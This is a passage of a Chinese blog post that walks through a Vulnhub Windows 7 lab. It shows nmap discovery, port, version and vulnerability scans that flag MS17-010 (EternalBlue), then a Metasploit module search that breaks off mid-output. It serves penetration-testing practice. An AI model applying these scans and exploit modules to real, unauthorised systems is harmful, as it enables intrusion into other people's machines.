<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><title data-next-head="">Vulnhub - win7-attack | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="win7-attack

 by gongli
 

端口扫描主机发现

1. 探测存活主机，`161`是靶机
    
    
    
2. 探测主机所有开放端口
    
    
    
3. 探测服务版本以及系统版本
    
    
    
4. 扫描漏洞
    
    
    
5. 一波操作，web服务器是`IIS 7.5` ，mysql版本是`5.5.11` ,以及..." data-next-head=""/><meta property="og:title" content="Vulnhub - win7-attack | Sunset Blog" data-next-head=""/><meta property="og:description" content="win7-attack

 by gongli
 

端口扫描主机发现

1. 探测存活主机，`161`是靶机
    
    
    
2. 探测主机所有开放端口
    
    
    
3. 探测服务版本以及系统版本
    
    
    
4. 扫描漏洞
    
    
    
5. 一波操作，web服务器是`IIS 7.5` ，mysql版本是`5.5.11` ,以及..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/04/02/Vulnhubwin7-attack" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-02" data-next-head=""/><meta property="article:modified_time" content="2025-04-02" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="Vulnhub" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Vulnhub - win7-attack" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/04/02/Vulnhubwin7-attack" data-next-head=""/><link rel="preload" href="/_next/static/css/a874b9d2e752557b.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-04-02","description":"win7-attack\n\n by gongli\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`161`是靶机\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n5. 一波操作，web服务器是`IIS 7.5` ，mysql版本是`5.5.11` ,以及...","mainEntityOfPage":{"@type":"WebPage","@id":"https://sunsetaction.top/2025/04/02/Vulnhubwin7-attack"},"headline":"Vulnhub - win7-attack","image":["https://sunsetaction.top/images/logo.png"],"dateModified":"2025-04-02","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://sunsetaction.top/images/logo.png"}}}</script><link rel="stylesheet" href="/_next/static/css/a874b9d2e752557b.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-c00868d23a7ea88d.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-11d6836cabe9ca8b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/525-0d15655fabd4a1e0.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-df398890bebcf477.js" defer=""></script><script src="/_next/static/AQ7er0iu8khUr2lT-18RD/_buildManifest.js" defer=""></script><script src="/_next/static/AQ7er0iu8khUr2lT-18RD/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">Vulnhub - win7-attack</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-02</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-02<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Vulnhub</span></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"Vulnhubwin7-attack","contentHtml":"\u003ch1\u003ewin7-attack\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eby gongli\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e端口扫描主机发现\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e探测存活主机，\u003ccode\u003e161\u003c/code\u003e是靶机\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-20 10:59 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00027\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00021\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00026\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:BD:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003eE:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00025\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:E1:D9:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eD (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.151\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测主机所有开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-20 11:01 CST\u003c/span\u003e\nWarning: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e giving up on port because retransmission cap \u003cspan class=\"hljs-title function_ invoke__\"\u003ehit\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00072\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e64615\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused), \u003cspan class=\"hljs-number\"\u003e907\u003c/span\u003e filtered tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (no-response)\nPORT      STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp    open  http\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp   open  msrpc\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp   open  netbios-ssn\n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp   open  microsoft-ds\n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp  open  mysql\n\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e/tcp  open  ms-wbt-server\n\u003cspan class=\"hljs-number\"\u003e5357\u003c/span\u003e/tcp  open  wsdapi\n\u003cspan class=\"hljs-number\"\u003e49152\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49153\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49154\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49155\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49156\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49157\u003c/span\u003e/tcp open  unknown\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:BD:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003eE:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e探测服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p80,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5357\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nPORT     STATE SERVICE        VERSION\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   open  http           Microsoft IIS httpd \u003cspan class=\"hljs-number\"\u003e7.5\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp  open  msrpc          Microsoft Windows RPC\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn\n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp  open  microsoft-ds   Microsoft Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e microsoft-\u003cspan class=\"hljs-title function_ invoke__\"\u003eds\u003c/span\u003e (\u003cspan class=\"hljs-attr\"\u003eworkgroup\u003c/span\u003e: WORKGROUP)\n\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e/tcp open  mysql          MySQL \u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e/tcp open  ms-wbt-server?\n\u003cspan class=\"hljs-number\"\u003e5357\u003c/span\u003e/tcp open  http           Microsoft HTTPAPI httpd \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e (SSDP/UPnP)\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org/cgi-bin/submit.cgi?new-service :\u003c/span\u003e\nSF-Port3389-TCP:V=\u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN%I=\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e%D=\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e%Time=\u003cspan class=\"hljs-number\"\u003e67147317\u003c/span\u003e%P=x86_64-pc-linux-gnu%\nSF:\u003cspan class=\"hljs-title function_ invoke__\"\u003er\u003c/span\u003e(TerminalServerCookie,\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"\\x03\\0\\0\\x13\\x0e\\xd0\\0\\0\\x124\\0\\x02\\x01\\x08\\\nSF:0\\x02\\0\\0\\0\"\u003c/span\u003e);\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:BD:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003eE:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Microsoft Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e\nOS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::\u003cspan class=\"hljs-variable constant_\"\u003esp1\u003c/span\u003e cpe:/o:microsoft:windows_server_2008::\u003cspan class=\"hljs-variable constant_\"\u003esp1\u003c/span\u003e cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nOS details: Microsoft Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e SP0 - SP1, Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e SP1, Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2, Windows \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows \u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e Update \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003enmap -script=vuln -p80,\u003cspan class=\"hljs-number\"\u003e3306\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5357\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-10-20 11:05 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.162\u003c/span\u003e\nHost is up (\u003cspan class=\"hljs-number\"\u003e0.00040\u003c/span\u003es latency).\n\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   open  http\n|_http-stored-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any stored XSS vulnerabilities.\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n|_http-csrf: Couldn'\u003c/span\u003et find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n| http-enum: \n|   /robots.txt: Robots file\n|_  /data/: Potentially interesting folder\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n3306/tcp open  mysql\n|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)\n3389/tcp open  ms-wbt-server\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n5357/tcp open  wsdapi\nMAC Address: 00:0C:29:BD:3E:47 (VMware)\n\nHost script results:\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n|_smb-vuln-ms10-054: false\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e一波操作，web服务器是\u003ccode\u003eIIS 7.5\u003c/code\u003e ，mysql版本是\u003ccode\u003e5.5.11\u003c/code\u003e ,以及135 \u003ccode\u003eRPC\u003c/code\u003e，138 \u003ccode\u003eNetBIOS\u003c/code\u003e，445 \u003ccode\u003eSMB\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e扫描漏洞，80端口下存在两个较可疑文件夹；3306疑似发现\u003ccode\u003ecve2012-2122\u003c/code\u003e；还扫描到了SMB服务器的漏洞\u003ccode\u003eCVE-2017-0143\u003c/code\u003e 等级为\u003ccode\u003ehigh\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e优先级：\u003ccode\u003eCVE-2017-0143\u003c/code\u003e \u003e 80 \u003e…\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eCVE-2017-0143\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e永恒之蓝 MS17-010\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e检测是否存在\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e使用msf进行扫描是否存在\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003e search MS17\u003cspan class=\"hljs-number\"\u003e-010\u003c/span\u003e\n\nMatching Modules\n================\n\n   #   Name                                           Disclosure Date  Rank     Check  Description\n   -   ----                                           ---------------  ----     -----  -----------\n   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e   exploit/windows/smb/ms17_010_eternalblue       \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-03\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-14\u003c/span\u003e       average  Yes    MS17\u003cspan class=\"hljs-number\"\u003e-010\u003c/span\u003e EternalBlue SMB Remote Windows Kernel Pool Corruption\n   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e     \\_ target: Automatic Target                  .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e     \\_ target: Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e                         .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e     \\_ target: Windows Embedded Standard \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e       .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e     \\_ target: Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2            .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e     \\_ target: Windows \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e                         .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e     \\_ target: Windows \u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e                       .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e     \\_ target: Windows Server \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e               .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e     \\_ target: Windows \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e Pro                    .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e     \\_ target: Windows \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e Enterprise Evaluation  .                .        .      .\n   \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e  exploit/windows/smb/ms17_010_psexec            \u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-03\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-14\u003c/span\u003e       normal   Yes    MS17\u003cspan class=\"hljs-number\"\u003e-010\u003c/span\u003e EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   \u003cspan 